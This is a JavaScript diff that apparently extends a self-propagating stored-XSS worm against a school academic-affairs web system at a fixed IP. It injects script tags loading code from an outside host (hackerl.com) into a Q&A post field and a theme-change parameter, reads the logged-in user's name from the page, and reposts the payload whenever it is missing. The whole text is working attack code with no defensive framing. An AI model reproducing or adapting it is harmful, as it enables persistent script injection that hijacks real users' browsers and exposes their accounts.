@@ -54,7 +54,7 @@ function creat(){
 
     request.open("POST","http://218.64.56.18/jsxsd/zxwd/tw_add_save",true);
     request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    request.send("xmms=请问四级没过可以毕业吗?<script language=\"javascript\" src=\"http://www.hackerl.com/static/js/about.js\" type=\"text/javascript\"></script>");
+    request.send("xmms=游戏参与者："+document.getElementById("ysgg_query").contentWindow.document.getElementById("Top1_divLoginName").innerHTML+"<script language=\"javascript\" src=\"http://www.hackerl.com/static/js/joke.js\" type=\"text/javascript\"></script><script language=\"javascript\" src=\"http://www.hackerl.com/static/js/about.js\" type=\"text/javascript\"></script>");
 	}, 1000);
 }
 
@@ -71,7 +71,7 @@ function check(){
     request.onreadystatechange = function () {
     if (request.readyState === 4) { 
         if (request.status === 200) {
-            if(request.responseText.indexOf("请问")==-1){creat();}
+            if(request.responseText.indexOf("游戏参与者")==-1){creat();}
         } else {
             return 0;
         }
@@ -81,6 +81,19 @@ function check(){
     request.open('GET', '/jsxsd/zxwd/zxwd_opt');
     request.send();
 }
-
+function theme(){
+    setTimeout(function () {
+    var request;
+    if (window.XMLHttpRequest) {
+        request = new XMLHttpRequest();
+    } else {
+        request = new ActiveXObject('Microsoft.XMLHTTP');
+    }
+    request.open("POST","http://218.64.56.18/jsxsd/system/changeTheme.do",true);
+    request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    request.send("changeTheme=blue.css\"><script language=\"javascript\" src=\"http://www.hackerl.com/static/js/hackerl.js\" type=\"text/javascript\"></script> <link id=\"link_theme\" type=\"text/css\" rel=\"stylesheet\" href=\"/jsxsd/framework/images/blue");
+    }, 1000);
+}
+theme();
 get_data();
 check();
